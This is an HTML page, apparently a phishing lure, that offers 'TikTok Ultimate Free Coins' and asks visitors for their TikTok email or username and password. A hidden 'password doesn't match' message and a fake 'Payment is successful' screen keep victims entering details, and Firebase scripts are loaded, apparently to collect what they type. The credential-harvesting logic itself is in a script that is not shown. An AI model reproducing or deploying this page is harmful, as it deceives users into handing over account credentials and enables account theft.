<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="./css/style.css" />
    <link
      rel="shortcut icon"
      href="./assets/img/favicon.png"
      type="image/x-icon" />
    <title>TikTok Ultimate Free Coins</title>
  </head>
  <body>
    <main>
      <!-- top -->
      <aside class="top">
        <div>
          <h1>
            Get Ultimate TikTok Coins
            <img class="coin" src="./assets/img/coin2.png" alt="" />
          </h1>
        </div>
      </aside>
      <!-- top -->

      <!-- bottom -->
      <aside class="bottom">
        <div class="inputs-wrapper">
          <input class="user" type="text" placeholder="Email or username" />
          <input class="pasw" type="password" placeholder="Password" />
          <div class="btn-wrapper">
            <button class="login-btn">Log in</button>
          </div>
          <div class="pswerror-wrapper hidden">
            <p class="pswerror">
              Username or password doesn't match our records. Try again.
            </p>
          </div>
        </div>
        <div class="secondpage hidden">
          <div class="input-item">
            <img class="coin" src="./assets/img/coin2.png" alt="" />
            <input
              class="coinsinput"
              type="text"
              placeholder="Coins Quantity" />
            <h4 class="sucssesfuly hidden">Payment is successful</h4>
            <div class="btn-wrapper send">
              <button class="send-btn">Send</button>
            </div>
            <div class="btn-wrapper back hidden">
              <button class="main-btn">Back</button>
            </div>
          </div>
        </div>
      </aside>
      <!-- bottom -->

      <div class="container hidden">
        <div class="tiktok"></div>
        <div class="tiktok red"></div>
      </div>
    </main>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/3.1.0/firebase.js"></script>
    <script src="./js/app.js"></script>
  </body>
</html>
